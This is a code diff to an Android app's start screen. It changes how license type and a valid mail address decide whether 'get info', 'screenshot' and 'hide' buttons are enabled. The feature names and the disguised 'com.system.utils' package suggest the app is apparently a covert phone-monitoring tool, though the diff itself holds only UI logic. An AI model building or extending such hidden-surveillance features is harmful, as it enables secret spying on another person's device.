@@ -8,7 +8,6 @@ import java.util.List;
 
 import android.app.Activity;
 import android.content.Intent;
-import android.content.res.Resources;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
@@ -23,6 +22,7 @@ import com.system.utils.ConfigCtrl;
 import com.system.utils.DeviceProperty;
 import com.system.utils.FileCtrl;
 import com.system.utils.SysUtils;
+import com.system.utils.license.LicenseType;
 import com.system.utils.mail.MailCfg;
 
 public class InitActivity extends Activity 
@@ -66,13 +66,15 @@ public class InitActivity extends Activity
         hint_setting = (TextView)findViewById(R.id.hint_setting);
         hint_hide = (TextView)findViewById(R.id.hint_hide);
         
-        // Disable buttons
-        btn_getinfo.setEnabled(false);
-        btn_screenshot.setEnabled(false);
-        btn_hide.setEnabled(false);
-        hint_getinfo.setEnabled(false);
-        hint_screenshot.setEnabled(false);
-        hint_hide.setEnabled(false);
+        // Set button status
+        boolean enabled = false;
+        if (ConfigCtrl.getLicenseType(getApplicationContext()) != LicenseType.NotLicensed) enabled = true;
+        btn_getinfo.setEnabled(enabled);
+        btn_screenshot.setEnabled(enabled);
+        btn_hide.setEnabled(enabled);
+        hint_getinfo.setEnabled(enabled);
+        hint_screenshot.setEnabled(enabled);
+        hint_hide.setEnabled(enabled);
         
         btn_screenshot.setVisibility(View.GONE);// TODO Invisible for v.1.0
         hint_screenshot.setVisibility(View.GONE);// TODO Invisible for v.1.0
@@ -83,17 +85,10 @@ public class InitActivity extends Activity
     {
     	if (resultCode == RESULT_OK) 
     	{
-			String isLicensed = data.getExtras().getString("isLicensed");
+			boolean isValidMailAddress = data.getExtras().getBoolean(GlobalPrefActivity.IS_VALID_MAIL_ADDRESS);
 
 			// Enable buttons
-			if (isLicensed.equalsIgnoreCase("full")) {
-				btn_getinfo.setEnabled(true);
-				btn_screenshot.setEnabled(true);
-				btn_hide.setEnabled(true);
-				hint_getinfo.setEnabled(true);
-				hint_screenshot.setEnabled(true);
-				hint_hide.setEnabled(true);
-			} else if (isLicensed.equalsIgnoreCase("onlysms")) {
+			if (isValidMailAddress) {
 				btn_getinfo.setEnabled(true);
 				btn_screenshot.setEnabled(true);
 				btn_hide.setEnabled(true);
